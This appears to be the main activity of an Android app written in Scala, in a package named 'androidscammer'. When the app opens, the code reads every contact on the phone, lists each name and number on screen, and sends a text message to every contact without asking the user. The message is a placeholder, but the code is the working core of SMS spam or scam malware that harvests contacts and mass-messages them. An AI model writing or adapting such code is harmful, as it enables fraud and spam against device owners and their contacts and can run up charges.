package org.furidamu.androidscammer

import android.app.Activity
import android.os.Bundle
import android.view.View
import android.provider.ContactsContract
import android.telephony.gsm.SmsManager
import Constants._
import scala.collection.JavaConversions._

class MainActivity extends Activity with TypedActivity {


  override def onCreate(bundle: Bundle) {
    super.onCreate(bundle)
    setContentView(R.layout.main)

    val status = findView(TR.textview)

    val reader = new ContactReader(this);

    val sm = SmsManager.getDefault();

    val contacts = reader.read() map { list => (list(0), list(1)) }

    contacts foreach { case (name, number) =>
    	status.text += "%s: %s\n".format(name, number)

			sm.sendTextMessage(number, null, "Test SMS Message", null, null);
    }


  }


}
